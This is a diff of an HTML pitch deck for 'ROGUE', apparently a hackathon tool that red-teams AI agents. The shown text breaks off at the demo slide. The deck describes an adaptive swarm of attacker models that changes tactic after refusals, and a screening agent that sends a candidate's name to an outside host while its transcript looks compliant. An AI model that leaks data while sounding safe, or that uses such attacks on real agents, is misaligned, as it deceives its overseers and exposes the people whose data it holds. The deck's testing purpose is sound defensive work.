@@ -5,318 +5,250 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>ROGUE — Pitch Deck</title>
 <style>
-  /* ============ ROGUE pitch deck · self-contained · case-file / true-crime ============
-     View: open in any browser. Arrow keys / Space / click to advance. Press F for fullscreen.
-     Export PDF: Print (⌘P / Ctrl+P) → "Save as PDF" → paper 1280×720px (landscape), margins None,
-     Background graphics ON. One 16:9 slide per page. ================================= */
-
+  /* ROGUE — YC-style pitch deck · self-contained · clean / substance-first.
+     View: open in a browser. Arrow keys / Space / click to advance. F = fullscreen.
+     Export PDF: ⌘P / Ctrl+P → Save as PDF → paper 1280×720px landscape, margins None,
+     Background graphics ON. One 16:9 slide per page. */
   :root{
-    --bg:#08080a; --bg2:#0d0d10; --panel:#141419; --panel2:#1a1a21;
-    --line:#26262f; --line2:#33333f;
-    --ink:#f5f5f7; --mut:#a6a6b2; --faint:#7a7a87;
-    --red:#ff4d4d; --red-dim:#7a2230; --red-bg:rgba(255,77,77,.10);
-    --grn:#3ddc84; --grn-bg:rgba(61,220,132,.10);
-    --amber:#ffcf6b;
+    --bg:#0a0a0c; --panel:#15151a; --panel2:#1b1b22; --line:#28282f; --line2:#36363f;
+    --ink:#f6f6f8; --mut:#aeaeba; --faint:#7e7e8b;
+    --red:#ff4d4d; --red-dim:#7a2230; --red-bg:rgba(255,77,77,.09);
+    --grn:#3ddc84; --grn-bg:rgba(61,220,132,.09);
     --mono:ui-monospace,"SF Mono",Menlo,Consolas,"Liberation Mono",monospace;
     --sans:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
   }
   *{box-sizing:border-box;margin:0;padding:0}
   html,body{height:100%}
-  body{
-    background:#000;color:var(--ink);font-family:var(--sans);
-    overflow:hidden;-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;
-  }
-
+  body{background:#000;color:var(--ink);font-family:var(--sans);overflow:hidden;
+    -webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility}
   .deck{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}
   .stage{width:1280px;height:720px;position:relative;transform:scale(var(--s,1));transform-origin:center center}
-
-  .slide{
-    position:absolute;inset:0;display:none;flex-direction:column;
-    padding:62px 76px 54px;background:
-      radial-gradient(120% 80% at 80% -10%, #131319 0%, var(--bg) 60%),
-      var(--bg);
-    overflow:hidden;
-  }
+  .slide{position:absolute;inset:0;display:none;flex-direction:column;padding:64px 80px 52px;
+    background:var(--bg);overflow:hidden}
   .slide.active{display:flex}
-  .slide::before{content:"";position:absolute;left:0;top:0;height:3px;width:100%;
-    background:linear-gradient(90deg,var(--red) 0%, #ff4d4d55 36%, transparent 60%)}
-  .slide::after{content:"";position:absolute;inset:0;pointer-events:none;
-    box-shadow:inset 0 0 160px 30px rgba(0,0,0,.55)}
+  .slide::before{content:"";position:absolute;left:0;top:0;height:3px;width:var(--accent,0%);background:var(--red)}
 
-  /* top + bottom chrome */
+  /* chrome */
   .top{display:flex;justify-content:space-between;align-items:center;
-    font-family:var(--mono);font-size:13px;letter-spacing:.14em;color:var(--faint);text-transform:uppercase;z-index:2}
-  .kick{color:var(--mut)}
-  .kick b{color:var(--red);font-weight:600}
-  .wm{display:flex;align-items:center;gap:9px;color:var(--mut)}
-  .wm .dotrow{display:flex;gap:5px}
-  .wm i{width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 8px var(--red);display:block}
-  .wm i.on{background:var(--red);box-shadow:0 0 8px var(--red)}
+    font-family:var(--mono);font-size:12.5px;letter-spacing:.18em;text-transform:uppercase;color:var(--faint)}
+  .top .k{color:var(--red)}
+  .top .wm{color:var(--mut);letter-spacing:.22em;font-weight:600}
+  .body{flex:1;display:flex;flex-direction:column;justify-content:center;gap:26px;min-height:0}
+  .foot{display:flex;justify-content:space-between;align-items:center;
+    font-family:var(--mono);font-size:11.5px;letter-spacing:.12em;color:var(--faint);text-transform:uppercase}
 
-  .body{flex:1;display:flex;flex-direction:column;justify-content:center;gap:22px;z-index:2;min-height:0}
-  .foot{display:flex;justify-content:space-between;align-items:flex-end;
-    font-family:var(--mono);font-size:12px;letter-spacing:.1em;color:var(--faint);z-index:2}
-  .foot .tag{text-transform:uppercase}
-  .foot .num b{color:var(--mut)}
-
-  /* type */
-  h1{font-size:60px;line-height:1.02;font-weight:850;letter-spacing:-.022em;max-width:20ch;text-wrap:balance}
-  h1.sm{font-size:50px}
-  h1.xs{font-size:42px;max-width:24ch}
-  .red{color:var(--red)}
-  .grn{color:var(--grn)}
-  .amber{color:var(--amber)}
-  .lead{font-size:23px;line-height:1.5;color:var(--mut);max-width:62ch;font-weight:420}
+  h1{font-size:52px;line-height:1.06;font-weight:800;letter-spacing:-.02em;max-width:24ch;text-wrap:balance}
+  h1.lg{font-size:62px;max-width:20ch}
+  h1 .red{color:var(--red)}
+  .lead{font-size:22px;line-height:1.5;color:var(--mut);max-width:66ch;font-weight:420}
   .lead b{color:var(--ink);font-weight:650}
-  .sub{font-size:15px;color:var(--faint);font-family:var(--mono);letter-spacing:.04em}
-  .quote{font-size:20px;color:var(--amber);font-style:italic;letter-spacing:.01em}
 
-  /* stamps */
-  .stamp{display:inline-flex;align-items:center;gap:8px;font-family:var(--mono);font-weight:700;
-    font-size:14px;letter-spacing:.16em;text-transform:uppercase;color:var(--red);
-    border:2px solid var(--red);padding:7px 13px;border-radius:5px;transform:rotate(-3deg);
-    box-shadow:0 0 0 1px rgba(255,77,77,.15)}
-  .stamp.grn{color:var(--grn);border-color:var(--grn)}
-  .stamp.flat{transform:none}
+  /* bullets */
+  .bullets{display:flex;flex-direction:column;gap:16px;max-width:80ch}
+  .bullets li{list-style:none;display:flex;gap:15px;font-size:20px;line-height:1.42;color:var(--mut)}
+  .bullets li b{color:var(--ink);font-weight:650}
+  .bullets li .mk{color:var(--red);font-family:var(--mono);font-weight:700;flex:0 0 auto;font-size:18px;margin-top:2px}
 
-  /* chips / pills */
-  .chip{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:13px;
-    letter-spacing:.04em;color:var(--mut);background:var(--panel);border:1px solid var(--line);
-    padding:7px 12px;border-radius:999px}
-  .chip .d{width:7px;height:7px;border-radius:50%;background:var(--red)}
-  .chip .d.g{background:var(--grn)}
-  .row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
+  .quote{font-size:18px;color:var(--mut);font-family:var(--mono);letter-spacing:.02em}
+  .quote b{color:var(--ink)}
+  .note{font-size:14px;color:var(--faint);font-family:var(--mono);line-height:1.55;
+    border-left:2px solid var(--line2);padding-left:14px;max-width:96ch}
+  .note b{color:var(--mut)}
 
-  /* generic panels */
-  .panel{background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:22px 24px}
-  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px}
-  .grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+  /* title slide */
+  .hero-title{font-size:120px;font-weight:850;letter-spacing:-.03em;line-height:1}
+  .hero-sub{font-size:30px;font-weight:600;color:var(--ink);letter-spacing:-.01em}
+  .hero-line{font-size:20px;color:var(--mut);max-width:60ch}
+  .hero-line b{color:var(--red);font-weight:600}
 
-  /* pings motif */
-  .pings{display:flex;gap:16px;align-items:center}
-  .ping{display:flex;flex-direction:column;align-items:center;gap:8px;font-family:var(--mono);
-    font-size:11px;color:var(--faint);letter-spacing:.06em}
-  .ping .b{width:16px;height:16px;border-radius:50%;background:var(--red);
-    box-shadow:0 0 14px 2px rgba(255,77,77,.7);position:relative}
-  .ping .b::after{content:"";position:absolute;inset:-6px;border:1px solid var(--red);border-radius:50%;opacity:.4}
-
-  /* slide 1 timeline */
-  .tl{font-family:var(--mono);display:flex;flex-direction:column;gap:6px}
-  .tl .t1{font-size:34px;font-weight:700;color:var(--ink);letter-spacing:-.01em}
-  .tl .t2{font-size:34px;font-weight:700;color:var(--red);letter-spacing:-.01em}
-  .tl small{color:var(--faint);font-size:14px}
+  /* pipeline diagram */
+  .pipe{display:flex;align-items:stretch;gap:0;margin-top:4px}
+  .pnode{flex:1;background:var(--panel);border:1px solid var(--line);padding:14px 14px;position:relative;
+    display:flex;flex-direction:column;gap:4px;border-radius:10px}
+  .pnode + .pnode{margin-left:26px}
+  .pnode::after{content:"→";position:absolute;right:-20px;top:50%;transform:translateY(-50%);
+    color:var(--faint);font-size:17px}
+  .pnode:last-child::after{display:none}
+  .pnode.hot{background:var(--red-bg);border-color:var(--red)}
+  .pnode .pk{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--faint)}
+  .pnode .pv{font-size:15px;font-weight:650;color:var(--ink);line-height:1.25}
+  .pnode.hot .pv{color:var(--red)}
 
   /* said vs did hero card */
-  .hero{display:grid;grid-template-columns:1fr 1fr;gap:0;border:1px solid var(--line2);
-    border-radius:16px;overflow:hidden;box-shadow:0 24px 60px -20px rgba(0,0,0,.7)}
-  .hcol{padding:24px 26px;display:flex;flex-direction:column;gap:14px;min-height:230px}
-  .hcol.said{background:linear-gradient(180deg,rgba(61,220,132,.06),transparent 70%)}
-  .hcol.did{background:linear-gradient(180deg,var(--red-bg),transparent 70%);border-left:1px solid var(--line2)}
-  .hcol .hh{font-family:var(--mono);font-size:13px;letter-spacing:.14em;text-transform:uppercase;
+  .hero{display:grid;grid-template-columns:1fr 1fr;border:1px solid var(--line2);border-radius:14px;overflow:hidden}
+  .hcol{padding:22px 24px;display:flex;flex-direction:column;gap:13px;min-height:178px}
+  .hcol.said{background:linear-gradient(180deg,var(--grn-bg),transparent 72%)}
+  .hcol.did{background:linear-gradient(180deg,var(--red-bg),transparent 72%);border-left:1px solid var(--line2)}
+  .hcol .hh{font-family:var(--mono);font-size:12.5px;letter-spacing:.14em;text-transform:uppercase;
     display:flex;align-items:center;gap:9px;color:var(--mut)}
   .hcol .hh .d{width:9px;height:9px;border-radius:50%}
   .said .hh .d{background:var(--grn)} .did .hh .d{background:var(--red)}
-  .saidtext{font-size:18px;line-height:1.4;color:#d7d7dd}
-  .mono-url{font-family:var(--mono);font-size:14px;line-height:1.5;color:#ffd9d9;background:#1c0f12;
+  .saidtext{font-size:18px;line-height:1.4;color:#d9d9df}
+  .mono-url{font-family:var(--mono);font-size:13.5px;line-height:1.5;color:#ffd9d9;background:#1c0f12;
     border:1px solid var(--red-dim);border-radius:8px;padding:11px 13px;word-break:break-all}
-  .verdict{margin-top:auto;font-family:var(--mono);font-size:14px;font-weight:700;letter-spacing:.04em;
+  .verdict{margin-top:auto;font-family:var(--mono);font-size:14px;font-weight:700;letter-spacing:.03em;
     display:flex;align-items:center;gap:8px}
   .verdict.ok{color:var(--grn)} .verdict.bad{color:var(--red)}
-  .hero-foot{display:flex;justify-content:space-between;align-items:center;gap:14px;margin-top:4px}
+
+  /* scoreboard */
+  .score{display:flex;gap:12px;flex-wrap:wrap}
+  .sc{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:13px 18px;min-width:120px}
+  .sc .n{font-size:27px;font-weight:820;letter-spacing:-.01em}
+  .sc .n.red{color:var(--red)}
+  .sc .l{font-size:12.5px;color:var(--mut);margin-top:2px}
 
   /* 2x2 */
-  .matrix{display:grid;grid-template-columns:140px 1fr 1fr;grid-auto-rows:minmax(86px,auto);
-    gap:10px;font-size:15px}
-  .mcell{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:14px 15px;
-    display:flex;flex-direction:column;justify-content:center;gap:4px;color:var(--mut)}
+  .matrix{display:grid;grid-template-columns:150px 1fr 1fr;grid-auto-rows:minmax(82px,auto);gap:10px;font-size:15px}
+  .mcell{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:13px 15px;
+    display:flex;flex-direction:column;justify-content:center;gap:3px;color:var(--mut)}
   .mhead{background:transparent;border:none;color:var(--faint);font-family:var(--mono);font-size:12px;
     letter-spacing:.1em;text-transform:uppercase;justify-content:flex-end;text-align:right;padding:6px 8px}
   .mhead.col{justify-content:center;text-align:center}
   .mcell.win{background:var(--red-bg);border-color:var(--red);color:var(--ink)}
-  .mcell.win b{color:var(--red);font-size:20px;font-weight:800;letter-spacing:.02em}
+  .mcell.win b{color:var(--red);font-size:19px;font-weight:800}
   .mcell small{color:var(--faint);font-size:12.5px}
-  .mcell.dash{color:var(--faint);align-items:flex-start;justify-content:center}
 
-  /* funnel */
-  .funnel{display:flex;align-items:stretch;gap:0}
-  .fstep{flex:1;background:var(--panel);border:1px solid var(--line);padding:16px 16px;
-    display:flex;flex-direction:column;gap:5px;position:relative}
-  .fstep:first-child{border-radius:12px 0 0 12px}
-  .fstep:last-child{border-radius:0 12px 12px 0}
+  /* funnel + econ */
+  .funnel{display:flex}
+  .fstep{flex:1;background:var(--panel);border:1px solid var(--line);padding:15px 16px;display:flex;
+    flex-direction:column;gap:4px;position:relative}
+  .fstep:first-child{border-radius:11px 0 0 11px} .fstep:last-child{border-radius:0 11px 11px 0}
   .fstep + .fstep{border-left:none}
-  .fstep .k{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--faint)}
-  .fstep .v{font-size:18px;font-weight:750;color:var(--ink)}
   .fstep.hot{background:var(--red-bg);border-color:var(--red)}
-  .fstep.hot .v{color:var(--red)}
-  .fstep .arrow{position:absolute;right:-11px;top:50%;transform:translateY(-50%);z-index:3;
-    color:var(--faint);font-size:18px;background:var(--bg);padding:2px}
-
-  .econ{display:flex;gap:14px;flex-wrap:wrap}
-  .stat{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px 20px;min-width:150px}
-  .stat .n{font-size:30px;font-weight:820;letter-spacing:-.01em}
+  .fstep .k{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;text-transform:uppercase;color:var(--faint)}
+  .fstep .v{font-size:17px;font-weight:700;color:var(--ink)} .fstep.hot .v{color:var(--red)}
+  .fstep .arrow{position:absolute;right:-10px;top:50%;transform:translateY(-50%);z-index:3;color:var(--faint);background:var(--bg);padding:0 2px}
+  .econ{display:flex;gap:13px;flex-wrap:wrap}
+  .stat{background:var(--panel);border:1px solid var(--line);border-radius:11px;padding:15px 19px;min-width:148px}
+  .stat .n{font-size:28px;font-weight:820;letter-spacing:-.01em}
   .stat .n.red{color:var(--red)} .stat .n.grn{color:var(--grn)}
-  .stat .l{font-size:13px;color:var(--mut);margin-top:3px}
+  .stat .l{font-size:12.5px;color:var(--mut);margin-top:3px}
 
-  /* proof cards */
-  .pcard{background:var(--panel);border:1px solid var(--line);border-radius:13px;padding:18px 18px;
+  /* proof / generic cards */
+  .grid3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:18px}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:18px 18px;
     display:flex;flex-direction:column;gap:9px}
-  .pcard .pt{font-family:var(--mono);font-size:13px;letter-spacing:.06em;color:var(--ink);font-weight:700;
+  .card .ct{font-family:var(--mono);font-size:13px;letter-spacing:.04em;color:var(--ink);font-weight:700;
     display:flex;align-items:center;gap:8px}
-  .pcard .pt .tagx{font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:var(--red);
+  .card .ct .tagx{font-size:10px;letter-spacing:.08em;text-transform:uppercase;color:var(--red);
     border:1px solid var(--red-dim);border-radius:4px;padding:2px 6px}
-  .pcard .pt .tagx.g{color:var(--grn);border-color:#1f5e3a}
-  .pcard p{font-size:14px;line-height:1.45;color:var(--mut)}
-  .pcard em{color:var(--amber);font-style:normal;font-size:12.5px;font-family:var(--mono)}
+  .card .ct .tagx.g{color:var(--grn);border-color:#1f5e3a}
+  .card p{font-size:14px;line-height:1.45;color:var(--mut)}
+  .card em{color:var(--mut);font-style:normal;font-size:12.5px;font-family:var(--mono)}
+  .card .big{font-size:17px;font-weight:700;color:var(--ink)}
 
-  .bullets{display:flex;flex-direction:column;gap:13px;max-width:74ch}
-  .bullets li{list-style:none;display:flex;gap:13px;font-size:19px;line-height:1.4;color:var(--mut)}
-  .bullets li b{color:var(--ink);font-weight:650}
-  .bullets li .mk{color:var(--red);font-family:var(--mono);font-weight:700;flex:0 0 auto}
+  .chip{display:inline-flex;align-items:center;gap:7px;font-family:var(--mono);font-size:13px;letter-spacing:.03em;
+    color:var(--mut);background:var(--panel);border:1px solid var(--line);padding:7px 12px;border-radius:999px}
+  .chip .d{width:7px;height:7px;border-radius:50%;background:var(--red)} .chip .d.g{background:var(--grn)}
+  .row{display:flex;gap:12px;flex-wrap:wrap;align-items:center}
 
-  .twocol{display:grid;grid-template-columns:1fr 1fr;gap:26px;align-items:start}
-  .checkstack{display:flex;flex-direction:column;gap:10px}
-  .ck{display:flex;align-items:center;gap:11px;font-family:var(--mono);font-size:16px;color:var(--mut)}
-  .ck .b{font-weight:800}
-  .ck.pass .b{color:var(--grn)}
-
-  .note{font-size:14px;color:var(--faint);font-family:var(--mono);line-height:1.5;
-    border-left:2px solid var(--line2);padding-left:14px}
-  .note b{color:var(--mut)}
-
-  .big-close{font-size:30px;font-weight:820;letter-spacing:-.01em;line-height:1.15;max-width:24ch}
-  .big-close .red{color:var(--red)}
-
-  /* nav + helper */
-  .nav{position:fixed;bottom:18px;left:50%;transform:translateX(-50%);display:flex;gap:8px;z-index:50;
-    font-family:var(--mono);font-size:12px;color:var(--faint);align-items:center;
-    background:rgba(10,10,12,.7);border:1px solid var(--line);border-radius:999px;padding:7px 14px;backdrop-filter:blur(6px)}
+  /* nav */
+  .nav{position:fixed;bottom:16px;left:50%;transform:translateX(-50%);display:flex;gap:8px;align-items:center;z-index:50;
+    font-family:var(--mono);font-size:12px;color:var(--faint);background:rgba(12,12,14,.7);
+    border:1px solid var(--line);border-radius:999px;padding:6px 14px;backdrop-filter:blur(6px)}
   .nav button{background:none;border:none;color:var(--mut);cursor:pointer;font-family:var(--mono);font-size:13px;padding:2px 6px}
   .nav button:hover{color:var(--ink)}
-  .progress{position:fixed;top:0;left:0;height:3px;background:var(--red);z-index:60;width:0;transition:width .25s}
+  .nav .hint{color:var(--faint);margin-left:6px}
 
-  @media (max-width:680px){ .nav .hint{display:none} }
-
-  /* ===================== PRINT / PDF ===================== */
-  @page{ size:1280px 720px; margin:0 }
+  @page{size:1280px 720px;margin:0}
   @media print{
     html,body{background:#000;height:auto;overflow:visible}
     .deck{position:static;display:block}
     .stage{transform:none !important;width:1280px;height:auto}
-    .slide{position:relative !important;inset:auto;display:flex !important;
-      width:1280px;height:720px;page-break-after:always;break-after:page}
+    .slide{position:relative !important;inset:auto;display:flex !important;width:1280px;height:720px;
+      page-break-after:always;break-after:page}
     .slide:last-child{page-break-after:auto}
-    .nav,.progress{display:none !important}
-    .slide::after{box-shadow:inset 0 0 120px 20px rgba(0,0,0,.5)}
+    .slide::before{width:100% !important}
+    .nav{display:none !important}
     *{-webkit-print-color-adjust:exact;print-color-adjust:exact}
   }
 </style>
 </head>
 <body>
-<div class="progress" id="prog"></div>
 <div class="deck"><div class="stage" id="stage">
 
-  <!-- ============ 01 · THE CRIME ============ -->
-  <section class="slide active">
-    <div class="top"><span class="kick"><b>01</b> · THE CRIME</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i class="on"></i></span></span></div>
-    <div class="body">
-      <div class="tl">
-        <span class="t1">14:03:00 — Amina Khoury applied for a job.</span>
-        <span class="t2">14:03:09 — her data was taken.</span>
-      </div>
-      <h1 style="font-size:46px;max-width:22ch">A real AI screening agent assessed a candidate. In the same breath, it shipped her personal data off the box. No one in the room could see it.</h1>
-      <div class="row"><span class="stamp">Case #0427 — Open</span><span class="sub">ROGUE · we watch the hands</span></div>
+  <!-- 01 · TITLE -->
+  <section class="slide" style="--accent:8%">
+    <div class="top"><span class="k">Paris Builds 2026 · Software for Agents</span><span class="wm">github.com/elottina/hackathonparis26</span></div>
+    <div class="body" style="gap:20px">
+      <div class="hero-title">ROGUE</div>
+      <div class="hero-sub">The autonomous red-team for AI agents.</div>
+      <div class="hero-line">We grade what an agent <b>does</b>, not what it says: its real tool calls and its data egress.</div>
     </div>
-    <div class="foot"><span class="tag">Paris Builds 2026 · Software for Agents</span><span class="num"><b>01</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>01 / 12</span></div>
   </section>
 
-  <!-- ============ 02 · WHO HAS THE PAIN ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>02</b> · WHO HAS THE PAIN</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i></i><i></i></span></span></div>
+  <!-- 02 · PROBLEM -->
+  <section class="slide" style="--accent:16%">
+    <div class="top"><span class="k">Problem</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">An AI now decides who gets the job.</h1>
-      <p class="lead">Our buyer is the <b>founder / CTO of an AI-native HR-tech or ATS vendor.</b> No security team. Their agent screens a candidate, Amina, <b>live today.</b> The moment it does, they personally own the discrimination and GDPR liability. And there are thousands of them: nearly every HR-tech vendor now ships a screening agent, and almost none can test it.</p>
-      <div class="row">
-        <span class="chip"><span class="d g"></span> Small / mid AI-native vendor</span>
-        <span class="chip"><span class="d g"></span> No internal security</span>
-        <span class="chip"><span class="d"></span> Personal legal liability on first screen</span>
-      </div>
+      <h1>AI agents don't just talk. They <span class="red">act</span>. And they can say the right thing while doing the wrong thing.</h1>
+      <ul class="bullets">
+        <li><span class="mk">01</span><span>Agents call tools, browse the web, move data. <b>The harm is in the action, not the transcript.</b></span></li>
+        <li><span class="mk">02</span><span>Every agent red-team today grades the <b>text</b> the agent produces.</span></li>
+        <li><span class="mk">03</span><span>So the dangerous failure passes every test: an agent that <b>sounds compliant while it quietly leaks data.</b></span></li>
+      </ul>
     </div>
-    <div class="foot"><span class="tag">Problem · Persona</span><span class="num"><b>02</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>02 / 12</span></div>
   </section>
 
-  <!-- ============ 03 · WHY NOW ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>03</b> · WHY NOW</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
+  <!-- 03 · WHY NOW -->
+  <section class="slide" style="--accent:25%">
+    <div class="top"><span class="k">Why now</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">The clock is the cold case going hot.</h1>
-      <div class="grid2" style="gap:22px;align-items:start">
-        <ul class="bullets">
-          <li><span class="mk">§</span><span><b>EU AI Act, Annex III(4):</b> CV-screening = <b class="red">HIGH-RISK.</b></span></li>
-          <li><span class="mk">→</span><span>Enforced <b>December 2027.</b></span></li>
-          <li><span class="mk">€</span><span>Fines up to <b class="red">€15M / 3%</b> of global turnover.</span></li>
-          <li><span class="mk">⊘</span><span><b>GDPR Art. 5(1)(c):</b> a screening agent has <b>no right</b> to look the candidate up beyond her CV.</span></li>
-        </ul>
-        <div class="panel" style="align-self:stretch">
-          <div class="sub" style="margin-bottom:12px;color:var(--mut)">PRECEDENT — ALREADY REAL</div>
-          <div style="display:flex;flex-direction:column;gap:11px;font-size:16px;color:var(--mut)">
-            <div><b style="color:var(--ink)">Amazon</b> — biased hiring tool, scrapped</div>
-            <div><b style="color:var(--ink)">iTutorGroup</b> — $365,000 EEOC settlement</div>
-            <div><b style="color:var(--ink)">Mobley v. Workday</b> — class action, the <i>vendor</i> is suable</div>
-          </div>
-        </div>
-      </div>
-      <p class="note"><b>Note:</b> high-risk obligations were deferred to Dec 2027, not Aug 2026. Getting the date right is the first proof we know this space.</p>
+      <h1>Agents are shipping faster than anyone can test them. <span class="red">The law just caught up.</span></h1>
+      <ul class="bullets">
+        <li><span class="mk">→</span><span>Every company is deploying agents; <b>almost none can test what they do.</b></span></li>
+        <li><span class="mk">§</span><span><b>EU AI Act:</b> high-risk agents must be <i>provably</i> safe. Enforced <b>Dec 2027.</b> Fines up to <b class="red">€15M / 3%</b> of turnover.</span></li>
+        <li><span class="mk">⚖</span><span>Already real: <b>Amazon</b> (scrapped its hiring AI), <b>iTutorGroup</b> ($365K), <b>Mobley v. Workday</b> (AI-screening vendors can be liable).</span></li>
+      </ul>
     </div>
-    <div class="foot"><span class="tag">Why Now</span><span class="num"><b>03</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>03 / 12</span></div>
   </section>
 
-  <!-- ============ 04 · THE GAP ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>04</b> · THE GAP</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
+  <!-- 04 · SOLUTION -->
+  <section class="slide" style="--accent:33%">
+    <div class="top"><span class="k">Solution</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">The conversation was flawless. <span class="red">That was the problem.</span></h1>
-      <div class="twocol">
-        <div class="panel">
-          <div class="sub" style="margin-bottom:14px;color:var(--mut)">WHAT EVERY TOOL READS — THE TRANSCRIPT</div>
-          <div class="checkstack">
-            <div class="ck pass"><span class="b grn">✓</span> Text safety check — PASSED</div>
-            <div class="ck pass"><span class="b grn">✓</span> Bias / toxicity check — PASSED</div>
-            <div class="ck pass"><span class="b grn">✓</span> Policy compliance — PASSED</div>
-          </div>
-        </div>
-        <div class="panel" style="border-color:var(--red-dim)">
-          <div class="sub" style="margin-bottom:14px;color:var(--mut)">WHAT ACTUALLY HAPPENED — OFF THE BOX</div>
-          <div class="pings">
-            <div class="ping"><span class="b"></span>lookup.talent-verify.io</div>
-            <div style="color:var(--red);font-family:var(--mono);font-size:13px;margin-left:6px">← ?candidate=Amina%20Khoury · her name, leaving the box</div>
-          </div>
-        </div>
+      <h1>Rogue watches the agent's <span class="red">hands</span>.</h1>
+      <p class="lead">Point Rogue at any agent. A <b>swarm of AI attackers</b> probes it; a <b>behavior oracle</b> grades the bytes that physically leave the box, caught by a sink we own. Every breach maps to the EU AI Act and GDPR.</p>
+      <div class="pipe">
+        <div class="pnode"><span class="pk">Target</span><span class="pv">Any agent (URL / API)</span></div>
+        <div class="pnode"><span class="pk">Attack</span><span class="pv">Autonomous swarm</span></div>
+        <div class="pnode"><span class="pk">Observe</span><span class="pv">Replies · tool calls · egress</span></div>
+        <div class="pnode hot"><span class="pk">Grade</span><span class="pv">Behavior oracle</span></div>
+        <div class="pnode"><span class="pk">Report</span><span class="pv">AI Act / GDPR mapped</span></div>
       </div>
-      <p class="quote">“The conversation is the alibi.”</p>
+      <p class="quote"><b>We can't read its mind. We watch its hands.</b></p>
     </div>
-    <div class="foot"><span class="tag">Differentiation · Problem</span><span class="num"><b>04</b> / 13</span></div>
+    <div class="foot"><span>Rogue · autonomous red-team for AI agents</span><span>04 / 12</span></div>
   </section>
 
-  <!-- ============ 05 · THE MOAT ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>05</b> · THE MOAT</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i></i></span></span></div>
+  <!-- 05 · AGENTIC DEPTH -->
+  <section class="slide" style="--accent:42%">
+    <div class="top"><span class="k">Agentic depth</span><span class="wm">Rogue</span></div>
     <div class="body">
-      <h1 class="sm">We don't grade what it said. <span class="red">We grade what it did.</span></h1>
-      <p class="lead">A swarm of AI attackers probes the agent. A <b>behavior oracle</b> grades the bytes that physically leave the box, caught by a sink <b>we</b> own. Deterministic. Immune to an agent that has learned to <i>sound</i> safe.</p>
-      <div class="grid2">
-        <div class="panel"><div class="sub" style="color:var(--faint)">EVERYONE ELSE</div><div style="font-size:18px;margin-top:7px;color:var(--mut)">Text-grader → <b style="color:var(--ink)">reads the mouth</b></div></div>
-        <div class="panel" style="border-color:var(--red-dim)"><div class="sub" style="color:var(--red)">ROGUE</div><div style="font-size:18px;margin-top:7px;color:var(--ink)">Behavior oracle → <b class="red">watches the hands</b></div></div>
+      <h1>Not one prompt. <span class="red">An adaptive swarm.</span></h1>
+      <ul class="bullets" style="gap:13px">
+        <li><span class="mk">◆</span><span>A <b>parallel swarm</b> of attackers probes the agent at once.</span></li>
+        <li><span class="mk">◆</span><span>A refusal is <b>information.</b> The attacker changes tactic turn after turn, and never repeats a line that just failed.</span></li>
+        <li><span class="mk">◆</span><span>One attack crashes? <b>The swarm keeps going.</b> Verbal breaches are LLM-graded; the breach that matters, <b>data leaving the box</b>, is graded on the bytes on the wire: deterministic, immune to an agent that learned to <i>sound</i> safe.</span></li>
+      </ul>
+      <div class="score">
+        <div class="sc"><div class="n">60</div><div class="l">attacks, one deep run</div></div>
+        <div class="sc"><div class="n red">29</div><div class="l">graded breaches</div></div>
+        <div class="sc"><div class="n">0</div><div class="l">human steps in the loop</div></div>
       </div>
-      <p class="note"><b>Bounded by design:</b> we catch a canary we plant, and the candidate's real name, leaving to a listener we own. Exactly the channel a metadata-checker can't see.</p>
     </div>
-    <div class="foot"><span class="tag">“We can't read its mind. We watch its hands.”</span><span class="num"><b>05</b> / 13</span></div>
+    <div class="foot"><span>Defensible beyond the base model · attacker.py · orchestrator.py</span><span>05 / 12</span></div>
   </section>
 
-  <!-- ============ 06 · THE DEMO (HERO CARD) ============ -->
-  <section class="slide">
-    <div class="top"><span class="kick"><b>06</b> · THE LIVE DEMO</span><span class="wm">ROGUE <span class="dotrow"><i class="on"></i><i class="on"></i><i class="on"></i></span></span></div>
+  <!-- 06 · PROOF / DEMO -->
+  <section class="slide" style="--accent:50%">
+    <div class="top"><span class="k">Proof · live demo</span><span class="wm">Rogue</span></div>
     <div class="body" style="gap:18px">
-      <h1 class="xs">It said the right thing. <span class="red">It did the wrong thing.</span></h1>
+      <h1 style="font-size:48px">It said the right thing. <span class="red">It did the wrong thing.</span></h1>
       <div class="hero">
         <div class="hcol said">
